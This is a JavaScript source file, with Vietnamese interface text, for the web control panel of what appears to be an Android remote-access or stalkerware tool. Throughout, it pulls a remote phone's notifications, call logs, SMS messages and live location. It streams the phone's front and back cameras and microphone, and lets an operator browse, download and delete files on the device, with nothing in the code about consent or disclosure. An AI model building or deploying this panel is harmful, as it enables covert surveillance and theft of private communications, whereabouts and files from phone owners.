// Dynamic IP detection based on environment
function getServerURL() {
  const hostname = window.location.hostname;

  // If accessing via localhost or internal IP, use localhost
  if (hostname === 'localhost' || hostname === '127.0.0.1' || hostname.startsWith('192.168.') || hostname.startsWith('10.') || hostname.startsWith('172.')) {
    return 'http://localhost:3000';
  }

  // If accessing via external IP, use the same external IP
  return `http://${hostname}:3000`;
}

const socket = io(getServerURL(), {
  reconnection: true,
  reconnectionAttempts: 15,
  reconnectionDelay: 1000,
  reconnectionDelayMax: 5000,
  randomizationFactor: 0.5
});

const videoFront = document.getElementById('remoteVideoFront');
const videoBack = document.getElementById('remoteVideoBack');
const statusDiv = document.getElementById('status');
const notificationsDiv = document.getElementById('notifications');
const callLogsDiv = document.getElementById('callLogs');
const smsDiv = document.getElementById('smsMessages');
const debugLog = document.getElementById('debugLog');
const retryButton = document.getElementById('retryButton');
let peer;
let myId;
let androidClientId;
let map;
let marker;
let audioTrack = null;
let frontVideoTrack = null;
let backVideoTrack = null;

// Chunked Download State
let activeDownloads = {}; // Map of fileId -> { name, buffer, totalChunks, receivedChunks }

const config = {
  iceServers: [
    { urls: 'stun:stun.l.google.com:19302' },
    { urls: 'turn:numb.viagenie.ca', username: 'your@email.com', credential: 'yourpassword' }
  ]
};

function updateStatus(message) {
  console.log(message);
  statusDiv.textContent = message;
  logDebug(message);
  retryButton.style.display = message.includes('Failed') ? 'block' : 'none';
}

function logDebug(message) {
  const logEntry = document.createElement('div');
  logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
  debugLog.prepend(logEntry);
  while (debugLog.children.length > 50) {
    debugLog.removeChild(debugLog.lastChild);
  }
}

function addNotification(notification) {
  const notificationEl = document.createElement('div');
  notificationEl.className = 'notification';
  notificationEl.innerHTML = `
    <p><strong>Ứng dụng:</strong> ${notification.appName}</p>
    <p><strong>Tiêu đề:</strong> ${notification.title}</p>
    <p><strong>Nội dung:</strong> ${notification.text}</p>
    <p class="timestamp">${notification.timestamp}</p>
  `;
  notificationsDiv.prepend(notificationEl);
  while (notificationsDiv.children.length > 10) {
    notificationsDiv.removeChild(notificationsDiv.lastChild);
  }
  logDebug(`Nhận thông báo từ ${notification.appName}`);
}

function addCallLog(call) {
  const callLogEl = document.createElement('div');
  callLogEl.className = 'call-log';
  callLogEl.innerHTML = `
    <p><strong>Số điện thoại:</strong> ${call.number}</p>
    <p><strong>Loại:</strong> ${call.type}</p>
    <p><strong>Ngày:</strong> ${call.date}</p>
    <p><strong>Thời lượng:</strong> ${call.duration} giây</p>
  `;
  callLogsDiv.prepend(callLogEl);
  while (callLogsDiv.children.length > 10) {
    callLogsDiv.removeChild(callLogsDiv.lastChild);
  }
  logDebug(`Nhận nhật ký cuộc gọi: ${call.number}`);
}

function addSmsMessage(sms) {
  const smsEl = document.createElement('div');
  smsEl.className = 'sms-message';
  smsEl.innerHTML = `
    <p><strong>Số điện thoại:</strong> ${sms.address}</p>
    <p><strong>Loại:</strong> ${sms.type}</p>
    <p><strong>Ngày:</strong> ${sms.date}</p>
    <p><strong>Nội dung:</strong> ${sms.body}</p>
  `;
  smsDiv.prepend(smsEl);
  while (smsDiv.children.length > 50) {
    smsDiv.removeChild(smsDiv.lastChild);
  }
  logDebug(`Nhận tin nhắn SMS từ ${sms.address}`);
}

function initMap() {
  map = L.map('mapContainer').setView([0, 0], 13);
  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
    attribution: '© <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
  }).addTo(map);
}

function updateMap(latitude, longitude) {
  if (!map) {
    initMap();
  }
  if (marker) {
    marker.setLatLng([latitude, longitude]);
  } else {
    marker = L.marker([latitude, longitude]).addTo(map);
    marker.bindPopup('Vị Trí Thiết Bị').openPopup();
  }
  map.setView([latitude, longitude], 13);
  logDebug(`Cập nhật bản đồ: vĩ độ=${latitude}, kinh độ=${longitude}`);
}

function updateStreams() {
  if (frontVideoTrack) {
    const frontStream = new MediaStream([frontVideoTrack]);
    if (audioTrack) frontStream.addTrack(audioTrack);
    videoFront.srcObject = frontStream;
    videoFront.onloadedmetadata = () => {
      videoFront.play().catch(err => {
        console.error('Autoplay blocked for front:', err);
        updateStatus('Nhấn vào camera trước để phát');
        videoFront.setAttribute('controls', 'true');
      });
    };
  }
  if (backVideoTrack) {
    const backStream = new MediaStream([backVideoTrack]);
    if (audioTrack) backStream.addTrack(audioTrack);
    videoBack.srcObject = backStream;
    videoBack.onloadedmetadata = () => {
      videoBack.play().catch(err => {
        console.error('Autoplay blocked for back:', err);
        updateStatus('Nhấn vào camera sau để phát');
        videoBack.setAttribute('controls', 'true');
      });
    };
  }
  updateStatus('Đang nhận luồng video từ thiết bị');
}

function reconnectSocket() {
  updateStatus('Đang thử kết nối lại tới máy chủ...');
  socket.connect();
}

socket.on('connect', () => {
  updateStatus('Đã kết nối tới máy chủ');
});

socket.on('connect_error', (error) => {
  const message = `Socket.IO connection error: ${error.message} (${error.type})`;
  console.error(message);
  updateStatus('Kết nối thất bại. Đang thử lại...');
});

socket.on('id', id => {
  myId = id;
  logDebug(`Nhận ID socket: ${myId}`);
  socket.emit('identify', 'web');
  socket.emit('web-client-ready', myId);
  updateStatus('Đã sẵn sàng nhận luồng dữ liệu');
});

socket.on('android-client-ready', id => {
  if (androidClientId !== id) {
    androidClientId = id;
    logDebug(`Thiết bị Android đã sẵn sàng: ${id}`);
    updateStatus('Thiết bị Android đã kết nối');
  }
});

socket.on('notification', data => {
  logDebug(`Received notification from ${data.from}`);
  if (data.notification) {
    addNotification(data.notification);
  }
});

socket.on('call_log', data => {
  logDebug(`Received call log from ${data.from}`);
  if (data.call_logs) {
    data.call_logs.forEach(call => addCallLog(call));
  }
});

socket.on('sms', data => {
  logDebug(`Received SMS messages from ${data.from}`);
  if (data.sms_messages) {
    data.sms_messages.forEach(sms => addSmsMessage(sms));
  }
});

socket.on('location', data => {
  logDebug(`Received location from ${data.from}: lat=${data.latitude}, lng=${data.longitude}`);
  updateMap(data.latitude, data.longitude);
});

socket.on('signal', async (data) => {
  logDebug(`Received signal from ${data.from}: ${data.signal.type || 'candidate'}`);
  const { from, signal } = data;

  // Fallback: If we receive a signal, we know this peer exists and is the android client
  if (!androidClientId || androidClientId !== from) {
      androidClientId = from;
      logDebug(`[Recovery] Set androidClientId from signal: ${from}`);
      updateStatus('Android client detected via signal');
  }

  if (!peer) {
    logDebug('Đang tạo kết nối WebRTC mới...');
    try {
      peer = new RTCPeerConnection(config);
      peer.addTransceiver('video', { direction: 'recvonly' });
      peer.addTransceiver('video', { direction: 'recvonly' });
      peer.addTransceiver('audio', { direction: 'recvonly' });

      peer.ontrack = (event) => {
        const track = event.track;
        if (track.kind === 'audio') {
          audioTrack = track;
        } else if (track.kind === 'video' && track.id === 'front_camera') {
          frontVideoTrack = track;
        } else if (track.kind === 'video' && track.id === 'back_camera') {
          backVideoTrack = track;
        }
        updateStreams();
      };

      peer.onicecandidate = e => {
        if (e.candidate) {
          logDebug(`Sending ICE candidate: ${e.candidate.sdpMid}`);
          socket.emit('signal', {
            to: from,
            from: myId,
            signal: { candidate: e.candidate }
          });
        }
      };

      peer.oniceconnectionstatechange = () => {
        logDebug(`Trạng thái ICE: ${peer.iceConnectionState}`);
        updateStatus(`Kết nối ICE: ${peer.iceConnectionState}`);
        if (peer.iceConnectionState === 'failed') {
          updateStatus('Kết nối thất bại, vui lòng làm mới trang hoặc thử lại');
        }
      };

      peer.onsignalingstatechange = () => {
        logDebug(`Signaling state: ${peer.signalingState}`);
      };
    } catch (err) {
      console.error('Failed to create peer connection:', err);
      updateStatus(`Peer connection error: ${err.message}`);
    }
  }

  try {
    if (signal.type === 'offer') {
      logDebug(`Processing offer from Android, SDP: ${signal.sdp.substring(0, 50)}...`);
      await peer.setRemoteDescription(new RTCSessionDescription(signal));
      const answer = await peer.createAnswer();
      logDebug(`Created answer, SDP: ${answer.sdp.substring(0, 50)}...`);
      await peer.setLocalDescription(answer);
      logDebug('Sending answer back to Android');
      socket.emit('signal', {
        to: from,
        from: myId,
        signal: { type: 'answer', sdp: answer.sdp }
      });
    } else if (signal.candidate) {
      logDebug(`Adding ICE candidate: ${signal.candidate.candidate}`);
      await peer.addIceCandidate(new RTCIceCandidate(signal.candidate));
    }
  } catch (err) {
    console.error('Error handling signal:', err);
    updateStatus(`Error: ${err.message}`);
  }
});

socket.on('android-client-disconnected', () => {
  updateStatus('Thiết bị Android đã ngắt kết nối');
  if (peer) {
    peer.close();
    peer = null;
    videoFront.srcObject = null;
    videoBack.srcObject = null;
    document.body.style.backgroundColor = '#111827';
  }
  notificationsDiv.innerHTML = '';
  callLogsDiv.innerHTML = '';
  smsDiv.innerHTML = '';
  if (marker) {
    marker.remove();
    marker = null;
  }
  logDebug('Thiết bị Android đã ngắt kết nối');
});

socket.on('error', (error) => {
  console.error('Socket.IO server error:', error);
  updateStatus(`Lỗi máy chủ: ${error.message}`);
});

retryButton.addEventListener('click', reconnectSocket);

const fsPathInput = document.getElementById('fsPathInput');
const fsBackBtn = document.getElementById('fsBackBtn');
const fsGoBtn = document.getElementById('fsGoBtn');
const fileListDiv = document.getElementById('fileList');

let currentPath = "/storage/emulated/0/";

function requestFileList(path) {
  logDebug(`[FS] Requesting files for path: ${path}`);
  if (!androidClientId) {
    updateStatus('Chưa có thiết bị Android kết nối');
    logDebug('[FS] Lỗi: Chưa có ID thiết bị Android');
    return;
  }
  updateStatus(`Đang yêu cầu tệp: ${path}`);
  
  // Explicitly logging the emit
  console.log(`[FS] Emitting fs:list for path: ${path} to ${androidClientId}`);
  socket.emit('fs:list', { to: androidClientId, path: path }); // Send as Object to ensure correct routing
}

function renderFileList(files, path) {
  if (path) {
    currentPath = path;
    fsPathInput.value = path;
  }
  fileListDiv.innerHTML = '';
  
  if (!files || files.length === 0) {
    fileListDiv.innerHTML = '<div style="color: #9ca3af; padding: 10px;">Thư mục này trống.</div>';
    return;
  }

  // Sort: Directories first, then files
  files.sort((a, b) => {
    if (a.isDir && !b.isDir) return -1;
    if (!a.isDir && b.isDir) return 1;
    return a.name.localeCompare(b.name);
  });

  files.forEach(file => {
    const item = document.createElement('div');
    item.style.cssText = 'display: flex; align-items: center; padding: 8px; border-bottom: 1px solid #1f2937; cursor: pointer; transition: background 0.2s;';
    item.onmouseover = () => item.style.background = '#1f2937';
    item.onmouseout = () => item.style.background = 'transparent';

    const icon = document.createElement('span');
    icon.textContent = file.isDir ? '📁' : '📄';
    icon.style.marginRight = '10px';
    icon.style.fontSize = '1.2rem';

    const info = document.createElement('div');
    info.style.flex = '1';
    
    const name = document.createElement('div');
    name.textContent = file.name;
    name.style.color = file.isDir ? '#34d399' : '#d1d5db';
    name.style.fontWeight = file.isDir ? 'bold' : 'normal';

    const size = document.createElement('div');
    size.textContent = file.isDir ? 'Thư mục' : formatBytes(file.size);
    size.style.fontSize = '0.8rem';
    size.style.color = '#6b7280';

    info.appendChild(name);
    info.appendChild(size);

    const actions = document.createElement('div');
    
    if (!file.isDir) {
        const downloadBtn = document.createElement('button');
        downloadBtn.textContent = '⬇';
        downloadBtn.title = 'Tải xuống';
        downloadBtn.style.cssText = 'background: none; border: none; cursor: pointer; margin-right: 8px; font-size: 1.1rem;';
        downloadBtn.onclick = (e) => {
            e.stopPropagation();
            requestFileDownload(file.path);
        };
        actions.appendChild(downloadBtn);
    }
    
    const deleteBtn = document.createElement('button');
    deleteBtn.textContent = '🗑';
    deleteBtn.title = 'Xóa';
    deleteBtn.style.cssText = 'background: none; border: none; cursor: pointer; font-size: 1.1rem;';
    deleteBtn.onclick = (e) => {
        e.stopPropagation();
        if(confirm(`Xóa tệp ${file.name}?`)) {
            deleteFile(file.path);
        }
    };
    actions.appendChild(deleteBtn);

    item.appendChild(icon);
    item.appendChild(info);
    item.appendChild(actions);

    if (file.isDir) {
        item.onclick = () => {
            requestFileList(file.path);
        };
    }

    fileListDiv.appendChild(item);
  });
}

function formatBytes(bytes, decimals = 2) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const dm = decimals < 0 ? 0 : decimals;
    const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
}

function requestFileDownload(path) {
    updateStatus(`Đang yêu cầu tải xuống: ${path}`);
    if (androidClientId) {
        socket.emit('fs:download', { to: androidClientId, path: path });
    }
}

function deleteFile(path) {
    updateStatus(`Đang xóa: ${path}`);
    if (androidClientId) {
        socket.emit('fs:delete', { to: androidClientId, path: path });
        // Optimistically remove or refresh? Refresh is safer.
        setTimeout(() => {
             requestFileList(currentPath);
        }, 1000);
    }
}

fsGoBtn.addEventListener('click', () => {
    logDebug('[FS] Go button clicked');
    requestFileList(fsPathInput.value);
});

fsBackBtn.addEventListener('click', () => {
    logDebug('[FS] Back button clicked');
    // Basic parent directory logic
    let path = currentPath;
    if (path.endsWith('/')) path = path.slice(0, -1); // Remove trailing slash if exists (except root)
    if (path === '') path = '/'; // Handle root case
    
    const lastSlash = path.lastIndexOf('/');
    if (lastSlash !== -1) {
        // substring(0, lastSlash + 1) keeps the trailing slash of the parent 
        // e.g. /sdcard/foo -> /sdcard/
        const parent = path.substring(0, lastSlash + 1) || '/'; 
        logDebug(`[FS] Navigating up to: ${parent}`);
        requestFileList(parent);
    } else {
        logDebug('[FS] Already at root or invalid path');
        requestFileList('/');
    }
});


// Socket Handlers for FS
socket.on('fs:files', (data) => {
    // data is { from: ..., file_list: { currentPath: "...", files: [...] } }
    // Or sometimes just the inner object if the relay unpacking happened differently.
    // Based on StreamingService.java: 
    // msg.put("file_list", data); -> emit('fs:files', msg);
    // So distinct payload is `data.file_list`.
    
    logDebug('Đã nhận danh sách tệp');
    if (data.file_list) {
        renderFileList(data.file_list.files, data.file_list.currentPath);
    }
});

socket.on('fs:download_start', (data) => {
    // data: { fileId, name, size, totalChunks }
    const { fileId, name, size, totalChunks } = data;
    logDebug(`[FS] Bắt đầu tải: ${name} (${totalChunks} phần)`);
    activeDownloads[fileId] = {
        name: name,
        buffer: new Array(totalChunks),
        totalChunks: totalChunks,
        receivedChunks: 0,
        startTime: Date.now()
    };
    updateStatus(`Đang tải ${name} (0%)`);
});

socket.on('fs:download_chunk', (data) => {
    // data: { fileId, chunkIndex, content }
    const { fileId, chunkIndex, content } = data;
    const download = activeDownloads[fileId];
    
    if (download) {
        if (!download.buffer[chunkIndex]) {
             download.buffer[chunkIndex] = content;
             download.receivedChunks++;
        }
        
        // Update progress every 5% or so to avoid UI spam
        const progress = Math.floor((download.receivedChunks / download.totalChunks) * 100);
        if (progress % 5 === 0) {
            updateStatus(`Đang tải ${download.name} (${progress}%)`);
        }
    }
});

socket.on('fs:download_complete', (data) => {
    // data: { fileId }
    const { fileId } = data;
    const download = activeDownloads[fileId];
    
    if (download) {
        logDebug(`[FS] Tải hoàn tất: ${download.name}`);
        updateStatus(`Đang xử lý ${download.name}...`);
        
        // Verify we have all chunks (optional, but good practice)
        if (download.receivedChunks !== download.totalChunks) {
            logDebug(`[FS] Warning: Missing chunks for ${download.name}. Received ${download.receivedChunks}/${download.totalChunks}`);
            // We'll try to assemble anyway, but it might be corrupt.
        }

        // Reassemble
        const base64Complete = download.buffer.join('');
        downloadBase64File(base64Complete, download.name);
        
        const duration = (Date.now() - download.startTime) / 1000;
        updateStatus(`Đã tải xong ${download.name} trong ${duration}s`);
        
        // Cleanup
        delete activeDownloads[fileId];
    }
});

socket.on('fs:download_error', (data) => {
    const { fileId, error } = data;
    if (activeDownloads[fileId]) {
        const name = activeDownloads[fileId].name;
        updateStatus(`Tải thất bại: ${name}`);
        logDebug(`[FS] Download error for ${name}: ${error}`);
        delete activeDownloads[fileId];
    } else {
         logDebug(`[FS] Download error: ${error}`);
    }
});

// Deprecated single-blob handler (kept for potential fallback if needed, but likely unused manually)
socket.on('fs:download_ready', (data) => {
    logDebug('Nhận dữ liệu tải tệp (cũ)');
    if (data.file_data) {
        const { name, content } = data.file_data; 
        downloadBase64File(content, name);
        updateStatus(`Sẵn sàng tải: ${name}`);
    }
});

function downloadBase64File(base64Data, fileName) {
    const linkSource = `data:application/octet-stream;base64,${base64Data}`;
    const downloadLink = document.createElement("a");
    downloadLink.href = linkSource;
    downloadLink.download = fileName;
    downloadLink.click();
}

updateStatus('Đang kết nối tới máy chủ...');
logDebug('Đang khởi tạo giao diện web...');
initMap();